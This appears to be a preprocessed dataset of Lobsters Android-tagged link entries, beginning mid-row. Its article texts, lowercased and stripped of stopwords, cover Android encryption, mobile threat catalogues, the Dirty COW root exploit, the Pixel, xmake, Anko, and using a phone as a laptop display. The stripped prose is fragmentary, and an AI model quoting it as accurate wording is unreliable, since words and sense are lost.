environment tee running arm trustzone definitely solves problem unfortunately quite problem discussed arm trustzone work correctly guaranteed force attacker derive encryption key device make offline dictionary attack password much harder case hardware used cache key reveal input biometric fingerprint problem android n help time key initially derived happens ie following first login hardware appear much resulting derived key seem live forever normal userspace ram possible specific phone eg google pixel samsung device implement additional countermeasure stock android n phone hardware save mean feel depends whether glass half full glass half empty kind person optimistic type point android clearly moving right direction lot work still done even halfbaked implementation filebased implementation better last generation dumb fde android encryption also probably also think clown nice hand might notice pretty goddamn low standard word android still struggling deploy encryption achieves lock screen security apple figured six year ago even getting right bode well long term security android user shame many pointed user rely android phone disproportionately poorer atrisk treating encryption relatively low priority google basically telling people get protection user may keep fbi google back long term bad judgement google part
323,Lobsters,android,Android,What is mobile security? What is the mobile security ecosystem?,http://developers.redhat.com/blog/2016/11/21/what-is-mobile-security-what-is-the-mobile-security-ecosystem/,mobile security mobile security ecosystem,mobile security mobile security ecosystem,mobile security mobile security ecosystem recently introduced published draft national institute standard technology nist u department commerce talk assessing threat mobile device infrastructure document discus mobile threat catalogue describes identifies structure threat posed mobile information system blog summarizes document added context commentary based experience mobile industry helping organization building mobile apps ever today connected world security protection information highest priority recent distributed denial service ddos attack brought internet generated unauthorized use internet thing iot device proving yet security breach crippling use mobile device continues grow globally organization mobile apps access mission critical information important broader view entire mobile security ecosystem understand everything involves mobile security say information powerful weapon case protect mobile solution nist document outline catalog threat mobile device associated mobile infrastructure support development implementation mobile security solution better protect enterprise information technology smartphones tablet running modern mobile operating system primary target analysis iot device mobile device contain integrated hardware component support variety io mechanism communication mechanism wireless ie cellular wifi bluetooth gps nfc also include physical connector ie power synchronization cable sd card sim card etc wireless wired device communication mechanism expose mobile device distinct set threat must secured overall security device app may compromised secure since mobile device store lot data personal enterprise data becomes target sensitive information like home address telephone number medical information credit card number authentication information user password protecting data also mean protecting identity identity theft used gain unauthorized access information compromised stolen mobile security ecosystem mobile security ecosystem relates general threat category need reviewed understood threat mobile apps classified group software vulnerability exploit data residing within mobile app running mobile operating system malicious privacyinvasive apps identify malware based threat damage device andor mobile service different type authentication mechanism mobile apps authentication access device remote service remote network enterprise system vulnerability mobile apps represent high risk compromising sensitive personal enterprise data summary mobile app security data protection mobile app checklist securing mobile application building mobile apps architecture design app becomes critical first step security decision need made best practice need followed checklist consideration architecture design data transfer encryption dataatrest encryption store device andor store cloud data input validation use token key hashing salting password authentication corporate identity management integration security policy enterprise mobility management system emm need vpn connectivity backend integration legacy web service restful apis etc use data need transfer everything secure storage cloud onpremise file permission log file auditing information plan penetration test government regulatory compliance choice mobile application development platform feature information mobile app development security best practice major player space enterprise mobility management emm system common way managing employee mobile device enterprise include combination mobile device management mdm mobile application management mam functionality mdm focus securing monitoring mobile device mam focus app distribution controlling user access apps key feature emm system deliver mobile policy allowing whitelisted set application run remote data wipe ensuring lock screen disabling certain device peripheral eg camera different vendor offer different set policy important compare review difference implemented via sdks developer use building apps wrapper mechanism built mobile app binary source vulnerability mobile ecosystem mobile operating system vulnerability found mobile operating system level typically addressed platform vendor form patch new release android io window example vulnerability android gingerbread longer supported google considered one mobile operating system version malware attack device driver plugins provide access device hardware peripheral device functionality ordinarily unavailable webbased apps ie camera geolocation device motion accelerometer vibration battery status apache cordova plugins example mobile apps using device functionality potential security risk especially developer create plugins identify vulnerability cordova like mobile operating system cordova similar product report address security issue example critical issue identify apache cordova android release sd card sd card removable memory used expand storage capacity mobile device store data photo video music application data similar medium device laptopdesktop world sd card source malware spyware sim card removable hardware chip housing international mobile subscriber identity imsi needed obtain access cellular network preshared cryptographic key phone number even contact information every mobile device sim card making widely used security token world still hacker send properly signed binary sm text message downloads java applet onto sim access phone number identity information use modern sim card latest cryptography sm firewall selection binary sm trust recommended secure sim card mobile carrier infrastructure interoperability relates mobile operator includes threat base station network backhaul cellular network core signaling threat associated widely used signaling system network mobile network generation mobile network move proprietary network protocol ipbased network brought lot change many positive operation side time brought new security risk never seen mobile operator much either mobile app developer organization network infrastructure level tackle vulnerability important aware risk infrastructure interoperability level many detail lot thing learn regard mobile app security understanding ecosystem security threat good first step take building secured mobile solution http related
324,Lobsters,android,Android,Was the Google Pixel built in a mere 9 months?,http://arstechnica.com/gadgets/2016/10/the-google-pixel-a-nine-month-dash-to-mold-an-htc-phone-into-a-google-product/,google pixel built mere month,best android device buy rick osterloh huawei htc wired podcast android police information applelike control nine month development time explains lot open pixel xda developer justin case standard htc bootchain threeheaded dog monster list leo nike athena phoebus hermes artemis atlas setting expectation next year several software package bloomberg,ron amadeo google pixel google firstever selfbranded smartphone best android device buy origin device something curiosity though google stopped nexus line move hardware arena company produced piece hardware nt different nexus different anyone else official line google rick osterloh device made google google design work lot engineering htc described contract manufacturer playing similar role foxconn apple look closer though see lot evidence suggests htc larger hand design google willing admit day removed ship date pixel phone rumor report already popped paint better picture pixel development may really like huawei htc interesting tidbit come david pierce senior staff writer sister site wired speaking wired podcast pierce said told pixel phone mere nine month development time asking google phone nt level water resistance highend flagship pierce said answer essentially ran time apparently plan long time end blew started essentially went nothing launch nine month week let examine timeline would google blow everything end fill blank report android police claim google smartphone lineup originally going built huawei shortly nexus launched google began talk huawei produce smartphone portfolio report read google though set hard rule partnership huawei would relegated manufacturing role producing phone google branding according report huawei balked lack branding ceo richard yu ended negotiation google right put two account together easy conclude google huawei talk ate development time googlehtc pixel decision go selfbranded phone came huawei walked away led pierce blowing everything switching htc timeline also line report information february month launch pixel information said google planned take applelike control future smartphones via partnership htc nine month development time explains lot google pixel versus similarlooking htc device htc google may designed pixel look heavy htc influence inside inside pixel compared flagship competition htc motherboards device iphone note use l shaped motherboards pixel dedicate top phone component got skinny battery iphone samsung htcbranded square pixel nine month incredibly short amount time bring smartphone market back google owned motorola company frequently talked pipeline product needed work though google really half amount time develop pixel hard imagine google singlehandedly designed firstever smartphone scratch likely company heavily leaned htc developing designing pixel see ton evidence support theory first clue something anyone eye look lot like htc phone specifically newer device like htc htc desire ifixit recently cracked open pixel showed world inside look like seems htc influence ifixit teardowns phone compared htc teardown xda developer people finding evidence htc involvement went beyond foxconnstyle manufacturer pixel pixel xl kernel contain commits htc engineer mysterious htccerberus label stripped source code thanks android security research jon justin case sawyer also know htc work pixel bootchain sawyer describes pixel standard htc bootchain written signed htc htc cerberus reference interesting since sound lot like device codename cerberus threeheaded dog monster greek mythology htc often like name indevelopment device figure greek mythology take look list htc device see project named constellation like libra leo gemini greek deity like nike athena phoebus hermes artemis atlas cerberus would right home list htc cerberus codename htcbranded device eventually morphed googlehtc project setting expectation next year would say evidence point google leaning heavily htc design pixel deal huawei fell google htc put pixel together nine month likely reason accelerated development possible google took existing htc project htc cerberus remodeled pixel phone explains inside outside pixel look like htc started life way also would nt first pixel device interesting behindthescenes story last pixel device pixel c seems bounced several software package development commits chrome o android codebases suggested pixel c started touchbased version chrome o moved dual booted android chrome o eventually settled running android release pixel phone hardware great something quickly developed phone rather bland unambitious explanation rather best google pixel likely best google limited amount time think year look back first pixel phone transition halfway point nexus pixel wasnt quite full google phone next pixel phone google lot development time dave burke android vp engineering told bloomberg already seen photo sample device google debut next year put pixel minimum month development time though camera already development probably closer google slot standard device development cycle hopefully able produce hardware competitive apple samsungs world love get something distinct design allowing pixel stand least frequently mistaken iphone ultimately user want something justifies google move smartphone hardware story behind pixel important since give peek google hardware ambition year first step apparently rushed first step dave burke promising plan custom silicon future device hopefully seen tip iceberg google smartphone plan
325,Lobsters,android,Android,Two Syntax Styles of xmake.lua,http://tboox.org/2016/11/15/syntax-style/,two syntax style xmakelua,style style,recently xmake description syntax enhanced support two different grammar style time setadd style keyval style setadd style xmake classic style example target test setkind static adddefines debug addfiles src c test cpp advantage flexible control control variety highly complex configuration requirement disadvantage scope control obvious need manually standardized indentation keyval style added style recently example target name test defines debug file src c test cpp advantage readable disadvantage conditional compilation flexible two style xmake currently compatible support recommendation simple project need complicated conditional compilation use keyval way streamlined good readability complex engineering need greater control flexibility recommended use setadd way try mix write two style although supported description entire project feel confused try unify style description specification addition target like option task template supported two way write example setadd style option demo setdefault true setshowmenu true setcategory option setdescription enable disable demo module yn keyval style option name demo default true showmenu true category option desciption enable disable demo module yn custom task plugins written like setadd style task hello run onrun function trace print hello xmake end set menu setmenu usage usage xmake hello option description description hello xmake option option keyval style task name hello run function trace print hello xmake end menu usage usage xmake hello option description description hello xmake option option
328,Lobsters,android,Android,400% faster android layouts with Anko,https://medium.com/@vergauwen.simon/400-faster-layouts-with-anko-da17f32c45dd,faster android layout anko,faster layout anko skeuomorphism anko preform better devmetrics runtime layout conclusion github,faster layout ankoi playing anko curious advantage anko offered performance testsskeuomorphismso decided migrate quite advanced layout used back anko layout contains relativelayout container child imageviews drawables using slice surfaceview viewfinder textviews regular view still quite decent layout since nested containerswhy anko preform better xml layout parsed runtime xml need retrieved form asset xmlpullparser need parse element create one one attribute need parsed set correctly overhead much time actually getting wasted anko performance testi run test older device device android devs deal every day ran layout time device running devmetrics see staggering difference increasing requirement design animation performance think care fast good application preform hope convince using anko cost lot effortbeside fact layout lot faster due avoiding overhead building layout runtime include logic building wanted let recreate masterdetail sample android studio ankomainactivityso immediately see much different writing layout anko compared xml already taking advantage building layout xml compatibility check set elevation depending o version compared separate xml layout folderbut cluttering mainactivity anko code let extract anko offer solution using ankocomponent still use findviewbyid thus also still requires casting easily solve thatlet create interface offer bind unbind method similar like bind unbind view butter knifewe easily extract previous layout mainlayoutkt classand activity look lot neater anything special going aside fact call setcontentview mainlayoutbind set content view bind view view field see need findviewbyid need casting runtime layoutsif ever wanted logic building layout going love thislet analyse code anko offer configuration basically fancy checking runtime configuration nice syntax anko offer checking config screensize density language orientation fromsdk sdk uimode nightmode righttoleft smallestwidth layout dsl run device landscape screen width landscape also easily calculate size width calculate runtime set screen widthconclusionanko offer several solution traditional way building layout xml bypass overhead android deal building xml layout deal findviewbyid casting building layout runtime add logic want could improve mvvm setup could make layout dynamic adding logic small cost considering extreme effort clean high performing appsall code used example found github
329,Lobsters,android,Android,Google won't spike Linux Dirty Cow exploit until December Android patch,http://www.zdnet.com/article/google-wont-spike-linux-dirty-cow-exploit-until-december-android-patch/,google wo nt spike linux dirty cow exploit december android patch,dirty cow adapted rooting tool android security patch level highlight november update read android security,google pixel nexus device getting complete set fix november bulletin excluding dirty cow image james martincnet google november android security bulletin fix dozen critical flaw recently disclosed copyonwrite cow linux flaw dubbed dirty cowdirty cow tracked old bug affecting linux system could also used gain root android device notably disclosed october already exploit wild since ar technica reported recently adapted rooting tool multiple version android could used malicious purpose update going nexus pixel device coming day android security patch level level carry complete set fix november bulletin excluding dirty cow instead allocated supplemental security patch level however supplemental patch intended release december update pixel nexus device google wo nt require fixed android partner security patch level supplemental security level third tier google november patch behind partial patch level complete patch level google note android partner notified issue november bulletin october one day dirty cow revealed coordinated disclosure supplemental security patch level provided identify device contain fix issue publicly disclosed patch level defined google explained memo addressing recentlydisclosed vulnerability required security patch level kaspersky lab news service threat post highlight early disclosure vendor allowed example samsung patch dirty cow november update select galaxy device overall november update going nexus pixel device fix critical flaw highseverity flaw eight moderate flaw read android security
330,Lobsters,android,Android,MLFE v0.2.4 Released,http://noisycode.com/blog/2016/11/09/mlfe-v0-dot-2-4-released,mlfe released,mlfe version daniel abrahamsson type alias daniel daniel record presentation neel krishnaswami elm curious first time typed mlfetypererl contributing discussing freenode username,mlfe version available includes significant change fix type alias use union type type constructor thanks daniel abrahamsson work early support record row polymorphism fix map typed type alias daniel fix following type correctly module circle export type radius float type circle circle radius new r circle r area c let pi match c circle r pi r r issue typer looking radius member tried type circle type variable used nested type handled correctly either big thanks daniel work record basic record row polymorphism supported mlfe compatible erlang record module recordswithx export makexy x xx yy makexyz x z xx yy zz getx rec match rec xx x matter type record pas record returned tuple always remember full set field return type eg pas return type wo nt forget z full type returned function pas exact record int x int int z int getxandtherecord rec match rec xx x rec worth noting module course construct polymorphic record could call makexy foo bar makexy two would distinct type x foo bar x string string x int float understanding row polymorphism far driven presentation neel krishnaswami well skimming paper elm history currently missing adding field record updatingreplacing accessing individual record field currently planning adding removal record field seems like could get problematic andor confusing quickly although pose particular technical challenge far tell add field record like following work take x return x hello string getxandaddhello rec match rec xx x rec hello world accessing individual member look pretty simple eg type int string let tuple getxandaddhello match tuple x rec recx rechello curious mlfe typer use row variable capture extra field record passed around row variable constructed added record first time typed function mlfetypererl probably also interest record currently compiled map simply make implementation right far easier tuples need way distinguish record map pattern match code generation add key struct key either map record distinguish two compiled pattern match course leverage well contributing discussing always contribution welcome subject licence code conduct specified project repository please join irc channel mlfe freenode help general discussion governed code conduct project irc twitter username
331,Lobsters,android,Android,xmake v2.0.5 released!,http://tboox.org/2016/10/30/update-v2.0.5/,xmake released,,
333,Lobsters,android,Android,Android phones rooted by “most serious” Linux escalation bug ever,http://arstechnica.com/security/2016/10/android-phones-rooted-by-most-serious-linux-escalation-bug-ever/,android phone rooted serious linux escalation bug ever,attacker actively exploiting hack web server machine proofofconcept code exploit dirty cow android publicly available dirty cow exploit doubleedge blade tethering done surreptitiously malicious apps spy user target rowhammer bitflipping hardware bug,new method rooting android device believed work reliably every version mobile operating system wide array hardware individual use bypass limitation imposed manufacturer carrier could also snuck apps malicious purpose technique come courtesy linux privilegeescalation bug came light last week attacker actively exploiting hack web server machine dirty cow people calling vulnerability introduced core linux kernel extremely easy exploit making one worst privilegeelevation flaw ever hit opensource o independent security researcher david manouchehri told ar proofofconcept code exploit dirty cow android get device close root additional line manouchehri code provides persistent root access five android device tested easy someone somewhat familiar android filesystem manouchehri said exploit tell theory able root every device since android android started linux kernel version exploit around since linux kernel version separate security researcher asked identified said several people developed separate rooting exploit based publicly available dirty cow exploit modified make work android give additional capability using rather unique route use elsewhere future well researcher said asked nt want disclose code want name published nt want google anyone shutting route video show researcher using app root androidpowered htc phone connected computer usb cable first id su command show device unrooted running moo name file containing exploit running su id command clear device rooted videoandroid root based dirty cow exploit doubleedge blade exploit allow end user root android phone capability tethering often restricted individual manufacturer carrier gaining access core part android o owner bypass limitation vastly expand thing device darker side rooting sometimes done surreptitiously malicious apps spy user circumventing application sandboxing security measure built android dirty cow allowed untrusted user attacker limited access linux server dramatically elevate control flaw allow shady app developer evade android defense cordon apps apps core o function reliability dirty cow exploit ubiquity underlying flaw make ideal malicious root trigger especially newer device running recent version android would surprised someone nt already done past weekend manouchehri said dirty cow came light day release separate rooting method android device drammer latter exploit dubbed significant target rowhammer bitflipping hardware bug allows attacker modify data stored device memory google plan release patch november make rowhammer much harder exploit dirty cow hole patched linux kernel matter time fix make way android soonest available release next month android patch batch course available large number device mostly limitation set manufacturer carrier
334,Lobsters,android,Android,When Your Screen Breaks (In The Himalayas),http://tombh.co.uk/when-your-screen-breaks-in-the-himalayas,screen break himalaya,screen break himalaya github pr bootstrap kbaker notpeter king root sujaym avahi ssh client juice ssh server auditor powerline vimairline terminal emulator busybox connect bot hiptext texttop auto hide soft key github repo github issue termux github repo creating bluetooth keyboard laptop keyboard pytooth related pytoothpy btkbdd hidclient bvnc laptoping phone tasker system setting null keyboard shortcut config writing book blog post jekyll slow internet mtr audio little script elinks patch enable sni texttop thing undo screen work,screen break himalaya october usually laptop screen break curse fork cash get fixed perhaps whilst waiting replacement part plug external monitor annoying show stopper two day bus ride nearest major city trust postal service send anything valuable situation found ladakh northern india amongst mighty himalaya come break work write book needed working computer much livelihood depended time geek hacker solution gist hack use phone monitor mean directly streaming video output vnc xforwarding although approach certainly part fix rather use phone multiple interface yes vnc often using laptop keyboard interface phone existing apps termux ssh laptop chrome gmail whatsapp etc took day get everything right pleased report written book made technical github pr functional little setup even got anything broken right reckon something hack find useful interesting also include writeup method coping extremely poor internet connectivity strictly anything broken screen part everyday usage curious setup linux android person detail applicable window mac io certainly general theme still relevant specifically rooted unchanged rom sony compact smartphone dell xps laptop running arch linux bootstrap like matt damon stranded character martian first technically blind achieving primitive initial step bootstrap could potentially slow painstaking ideally want ssh access phone laptop unlikely already setup fortunately automation side instance may already phone wifi hotspot set auto connect turn even almost certain o dhcp client auto connect usb tether two major obstacle installing ssh daemon discovering laptop ip address going need rely memory boot process think u least get desktop blind knew press arrow grub boot menu wait second enter username password desktop huge stroke luck extra good fortune two text line worth working pixel top screen well say working automatically update sort twist screen hand point decide update knew press altspace shortcut terminal see mouse cursor command prompt could press enter time get prompt output eventually appear tiny gap autoconnected usb tether internet needed type sudo pacman openssh needed enter sudo password first course sudo systemctl enable sshd sudo systemctl start sshd done luckily complication command may vary different system tip linux probably even better use vt eg blind guaranteed login directly followed prompt way even need wait desktop load start installing openssh etc thanks kbaker hn idea otherwise know os shortcut runner eg linux give text input type xterm similar osx altspace get runner assume get focus command prompt starting terminal app far know ssh daemon already installed osxs need start sudo systemsetup setremotelogin thanks notpeter tip argue good reason always setup ssh daemon strong password new laptop web server setup far exposed laptop significant security risk use strong authentication ssh key best need laptop ip address could type ifconfig keep pressing return saw magical inet netmask broadcast ip first address case since found actually discover address rooted android phone look datamiscdhcpdnsmasqleases rooting generally pretty easy android case app called king root another way suggested sujaym hn added benefit crossplatform use ip generate local network domain name avahi installed laptop use hostnamelocal hostname hostname laptop key stage get running ssh server find laptop ip think fix screen need provide ssh detail ssh client port default ssh case ssh client ssh may essential bootstrap also far app use talk later spend time writing neovim browsing web remote server using elinks even though android ssh client perfectly usable getting allimportant sudo access laptop longterm everyday usage ssh client actually provide feature make huge difference usability briefly mention well good least two ssh client installed also talk later basically time experimenting different method using laptop keyboard input phone managed freeze stdin way killing process ssh laptop different ssh client played android ssh client none perfect two use regularly mostly termux sometimes connectbot describe notable one ordered leastused first juice ssh broken screen app already knew used accessing remote cloud server thought pretty good well daily usage one major shortcoming set xterm variable mean terminal colour limited settle anything le talk later juice ssh like preferred client termux see support mosh improved sshlike protocol unreliable network connection server auditor one appears pretty modern ui clean friendly round excellent app however one show stopper niggle importantly support altkey combination seriously limit shortcut apps like neovim tmux multiple terminal inside single terminal secondly curiosity lot client correctly report width character really big deal unless use status line like powerline vimairline etc powerline tmux vimairline neovim whilst editing blog post status line actually useful spend lot time terminal tell thing like time remaining battery case tmux running session terminal happens special character like electricity symbol push end status line onto new line successive redraws status line eg time change gradually push copy status line screen see actual terminal anymore fix pretty easy remove character config case mean powerline though status line available interestingly status line use neovim vimairline suffer problem need tweaking suspected problem combination ssh client setting flag type stty cli see flag set tmux integration powerline however despite suspicion connectbot see reason render powerline perfectly terminal emulator one noteworthy like termux see give actual shell support mouse escape sequence shell case android actual shell get command come default android like ssh install busybox rest command know love like cat find grep ping sed etc mouse escape sequence pretty interesting happens touch gesture converted mouse event mean scroll swiping move cursor tapping may hugely useful cli useful apps like elinks purely textbased web browser talk later touchbased elinks something traveller user poor internet aware elinks problem client small significant used everyday tool support colour provides seem limited actually colour also support althome altend key combination connect bot actually used one lot day day client swung termux big plus highest screen update fps perfect font rendering notice high fps one thing working graphic tty renderer hiptext texttop font rendering purely aesthetic spending much time textbased environment appreciate every opportunity little graphical treat like character also powerline maintains set patched font extra character like triangular separator like filled chevron connectbot client render character perfect alignment know however connectbot like client actually support custom font box need little hack pretty simple rooted phone overwrite systemfontsdejavusansmonottf chosen font reboot another little hack use install auto hide soft key connectbot hide soft key back home menu want much screen real estate using phone laptop screen think connectbot actually oldest perhaps mature ssh client android sort active github repo however big reason app many ctrl alt key combination work github issue addressing part termux client settled lot lovely thing biggest reason stuck complete support key combination still problem getting neovim acknowledging alt combination another story niggles align powerline special character common width bug low screen update fps font alignment seems odd termux powerlinepatched font paid extra must make slight digression mention unexpected important discovery termux posse feature sweet spot mosh mouse escape sequence mean mosh remote server interact remote elinks browser finger clicking link scrolling without fiddling soft keyboard first might sound particularly exciting consider situation unstable connection censored internet dreaded combination mosh two thing make significant improvement ssh handle connection loss sends screen diffs lower bandwidth consumption connection disappears mosh display blue bar top screen saying much patiently wait return internet without permanently freezing like ssh sometimes use tmux server well mean reliable connection longlived browser session cooky tab using internet pipe faster even broaband imagine sitting bus chinese countryside literally need kilobyte connection every minute check gmail googling killer feature worth termux termux many best bit client actual shell though kind jail chroot mount native filesystem need install common binary dedicated termux repo eg apt update aptget install mosh mosh support apart unexpected moshelinks hack cool thing mosh connecting laptop disconnect phone put laptop sleep mosh instantly automatically reconnects connection plug back nb watch nested mosh session using mosh native ctrl kill parent session want kill child session manually find pid kill touch event converted mouse escape sequence true fullscreen support box nb using hardware keyboard want hide special character bar long holding keyboard button side drawer menu ctrlaltright toggle bar lot powerlinepatched font though cost little bit open source active github repo creating bluetooth keyboard laptop keyboard would crime take advantage laptop keyboard finger know well android apps let use frustratingly poor hack involving wifi telnet work something like ensure phone laptop network launch phone app point laptop browser shell particular ip port convoluted found even send key key combination suddenly thought surely get laptop act bluetooth keyboard well yes thing software needed actively maintained linux least available least useful first pytooth related seems attempt use python create bluetooth keyboard obviously people success make progress whatsoever main one pytoothpy btkbdd advantage one claim work iphonesmacs window also come separate tool provides shortcut switch keyboard acting bluetooth keyboard physical keyboard useful otherwise key press get sent laptop phone unfortunately although got binary compile could see key press log could never get key press phone hidclient year old surprisingly work fine however struggle getting system bluetooth stuff setup never reason driver laptop proprietary even installed disable rfkill stanza systemd config needed actually power bluetooth bluetoothctl time consuming problem discovering advice add disableplugininput etcbluetoothmainconf applicable good advice year ago hidclient et al round nowadays u case need add noplugininput arg bluetoothhd stanza etcsystemdsystemdbusorgbluezservice quick easy way avoid keypresses causing havoc desktop whilst happily type phone switch separate vt eg trouble quite often forget come back desktop find manner program open random text bvnc see desktop screen broken well occasionally vnc phone installed laptop beautifully simple setup install run give ip address port provide vnc client bvnc second client tried remember first one used render mouse cursor guess theoretically could everything wanted vnc screen update fps low fiddly pinch zoom time see going suppose could change resolution desktop match phone anyway happy enough ssh tmux however always come back vnc image editing gimp laptoping phone much bootstrapped root graphical access physical keyboard nothing however thing make life easier enable static ip address adding following etcsystemdnetworkwirednetwork match netowrk address disable password login boot sleep always go straight desktop entering password blind get feedback enter incorrectly besides still password login ssh ing create hidclientservice start bluetooth keyboard boot create usrlibsystemdsystemhidclientservice add following unit descriptionbroadcast physical keyboard bluetooth keyboard requiresbluetoothservice service execstartusrlocalsbinhidclient restartalways install wantedbymultiusertarget run systemctl enable hidclient always start boot automate setting connecting phone laptop use combination tasker system setting detect power usb phone turn toggle following setting usb tethering landscapeportrait mode bluetooth keyboard connection null keyboard input app simple hack never show soft keyboard without android display keyboard overlay whenever trigger text input focus annoying physical keyboard want install tasker system setting least want shortcut enable usb tethering use shortcut app create home screen icon quickly start usb tethering neovim config make like normal editor know know learn vim way done time argument never hear great editor debate vim rich plugin ecosystem allowed take advantage without learn vim keyboard grammar tmux copy paste set adding tmuxconf leader enters copy mode leader paste current buffer setwindowoption g modekeys vi bindkey vicopy v beginselection bindkey vicopy copyselection writing book blog post might writing book briefly explain method surprised easy accomplish neovim markdown pandoc write chapter etc run little script create pdf version whole book binbash echo building mkdir p build rm f buildbookmd cp rf md build chapter l build md echo chapter echo pagebreak chapter echo chapter done cat build md buildbookmd pandoc f markdown bookpdf buildbookmd echo built use jekyll static site generator blog similarly us markdown use neovim host github publishing simple matter git push whilst writing use jekyll serve host config use phone browser set laptop ip view blog publishing slow internet internet worse day dialup seems like half time absolutely internet rest time intermittent single digit kbps pretty standard ping aggregate googlein ping statistic packet transmitted received duplicate packet loss time rtt minavgmaxmdev m pipe mtr one thing find useful keep running visual ping give quick overview current state network eg lot red know good time googling little bit colour least hit r refresh change default ctrlr elinks session come back minute see got new mail inbox audio ping wrote little script give audio feedback live network quality mean something else house whilst waiting good enough internet sound mean internet higher pitch beep shorter ping time elinks clear elinks run remote server bandwidth high reliable even though textbased still need download entire site advantage need send page text wire sent using mosh diffing algorithm amount byte main tip using careful arrow key expect move link annoying next link page left right go back forth history use insertdelete scrolling use next tip actually navigating link hitting toggle displaying unique number link let type link number followed enter giving focus link hit enter go link open new background tab hit gg spacebar load address bar prefilled g whatever type next get sent google search like default behaviour graphical browser address bar tg spacebar result get loaded new foreground tab fairly major drawback elinks firstly support sni encrypted ssl page mean good portion modern http site load patch enable sni inclination try secondly complete j support course brave new world spa show stopper texttop elinks lack sni j support led develop textbased method displaying complete interactive firefox browser terminal us hiptext render gui text similar ascii art better us mouse escape sequence control mouse allowing scroll click zoom actually needed get api key digital ocean account good know need access site net dialupspeed connection thing undo screen work disable hidclientservice boot sudo systemctl disable hidclient reenable password login boot sleep
335,Lobsters,android,Android,Quiet for Android - TCP over sound,https://github.com/quiet/org.quietmodem.Quiet,quiet android tcp sound,orgquietmodemquiet charlie stross libquiet quietlwip sound nt outdated sound like try fast go platform libquiet quietlwip quietjs quietmodemkit apps use orgquietmodemquiet quiet share usage lwip tcp stack android ndk frame mode udptcp mode,orgquietmodemquiet nearly inaudible adult across airgapped device doomed part charlie stross orgquietmodemquiet allows pas data speaker android device library operate either raw frame layer udptcp stack package contains prebuilt library file libquiet quietlwip well dependency top add java binding closely mimic familiar interface javanet package package provided bsd license license dependency also included licensed mix bsd mit quiet come support requires android api mode api mode requires recordaudio permission testing purpose genymotion highly recommended default emulator genymotion provides access microphone default android studio one throw exception quiet attempt use microphone sound nt outdated old enough may remember using dialup modem connect internet sense package brings back true somewhat retro approach consider advantage using sound highly crossplatform device speaker microphone sufficient computational power use medium communicate pairing unlike bluetooth sound used instantly without need pair device reduces friction improves user experience embeddable content similar qr code short packet data encoded streaming recorded audio later decoded package sound like answer depends operating mode choose quiet provides audible nearultrasonic mode audible mode sound something like puff air nearultrasonic mode run virtually inaudible adult either mode operate relatively low volume long nt much background noise nt take word try fast go quiet provided audible mode transfer approximately case two device connected cable via jack run cable mode transfer approximately platform desktoplaptop libquiet quietlwip javascript quietjs udptcp coming soon io quietmodemkit apps use orgquietmodemquiet quiet share proof concept app allows text link shared one device another usage quiet used either raw frame layer udptcp mode latter provides lwip tcp stack operates entirely independently stack provided android make sure android ndk installed set location ndkdir localproperties necessary build jni wrapper included project frame mode assuming working mainactivityjava start import javaioioexception import orgquietmodemquiet framereceiverconfig receiverconfig null frametransmitterconfig transmitterconfig null try transmitterconfig new frametransmitterconfig receiverconfig new framereceiverconfig catch ioexception e could build configs framereceiver receiver null frametransmitter transmitter null try receiver new framereceiver receiverconfig transmitter new frametransmitter transmitterconfig catch modemexception e could set receivertransmitter set transmitter receiver using packaged configuration choose audible mode transmit one side might run set receiver block frame received default receiver nonblocking receiversetblocking byte buf new byte long recvlen try recvlen receiverreceive buf catch ioexception e read timed side string payload hello world try transmittersend payloadgetbytes catch ioexception e message might long transmit queue full enough send frame across frame mode useful want send small bit data easily fit one frame need concept sender receiver frame broadcast medium udptcp mode want interaction two device like retransmits automatic data segmentation tcp way go first build new networkinterface import javaioioexception import javanetsocketexception import orgquietmodemquiet framereceiverconfig receiverconfig null frametransmitterconfig transmitterconfig null try transmitterconfig new frametransmitterconfig receiverconfig new framereceiverconfig catch ioexception e could build configs networkinterfaceconfig conf new networkinterfaceconfig receiverconfig transmitterconfig networkinterface intf null try intf new networkinterface conf catch modemexception e network interface failure example omits ip address netmask networkinterfaceconfig tell quiet create auto ip automatically assign interface address although take several second probe settle address instantiate interface using quiet adhoc manner need discover peer nearby using broadcast udp packet side might run something like orgquietmodemquietdatagramsocket datagramsocket null try bind note using orgquietmodemquietinetsocketaddress javanetinetsocketaddress ssend new datagramsocket new inetsocketaddress listen srecv new datagramsocket new inetsocketaddress nt block second srecvsetsotimeout get broadcast permission ssendsetbroadcast true catch socketexception e exception creating datagramsocket byte send marco getbytes byte recv new byte inetsocketaddress peer null true get ready broadcast port orgquietmodemquietdatagrampacket datagrampacket p new datagrampacket send sendlength new inetsocketaddress try ssendsend p catch ioexception e exception sending datagramsocket datagrampacket precv new datagrampacket recv recvlength boolean received false try srecvreceive precv received true peer precvgetsocketaddress respond peer know psetdata polo getbytes psetsocketaddress peer ssendsend p catch ioexception e exception receiving datagramsocket received break read timeout act sleep continue broadcasting get bite use peer address somehow continue sending udp establish tcp connection another port finished close ssend srecv intf
336,Lobsters,android,Android,Back Up an SD Card from Android,http://jb.rainsberger.ca/permalink/back-up-an-sd-card-from-android,back sd card android,use ftp send file phone macbook could copy file commandline tool edu rodríguez showed find android commandline tool please tell expect copying file android phone http summary wait http http githubcomsschuberthdevscriptsblobmasterandroidpullallsh,wanted replace gb sd card galaxy note gb sd card assumed could simply take smaller sd card phone connect usb usbbased sd card reader macbook copy content larger sd card insert larger sd card phone go merry way course inserted smaller sd card macbook told could read sd card assume formatting issue guessed needed transfer file usb phone connected phone usb launched android file transfer sadly android file transfer terrible tried copy large amount data single folder tree gb audio android file transfer froze tell difference slow stuck seemed handle smaller batch data fine refuse babysit tool device work searching web found suggestion use ftp send file phone macbook meant installing andftp phone launching ftpd macbook tried sadly ftp great protocol make folder best overwriteresume phone copy gb data one session tell much copied file needed recopy moreover sent file approximately mb mean take hour try copy everything appears long enough copying fail srsly lastditch effort tried installing adb could copy file commandline tool likely work importantly easier script need copy file batch naturally android world decided make thing easier repackaging android development tool inside android studio thereby making harder learn use simple commandline tool posted article edu rodríguez showed find android commandline tool led discover old version android commandline tool installed opt suppose installed time might thing remove file optandroidsdkmacosx patch zshrc remove path reference old android sdk realized homebrew must package sure enough gracias edu turn time ignorantly went long way ended launch android studio since installed previously desperate attempt hack android project year ago think went notice android studio date update restart notice android development tool date update restart android studio try launch adb command line notice android development tool system path figure android studio installed development tool try putting directory system path finally seemed help could launch adb command line yay actually copy stuff assume adding homelibraryandroidsdkplatformtools system path conflict installing android sdk homebrew fortunately never changed system path sure whether environment stable knew work changed current bash session even sure launched android sdk uninstalled platform tool make sure old incompatible partiallyinstalled version lying around file system somewhere like discover fortunately mean however write word probably use homebrew install androidsdk launch android sdk install platform tool homebrew warns formula androidsdk 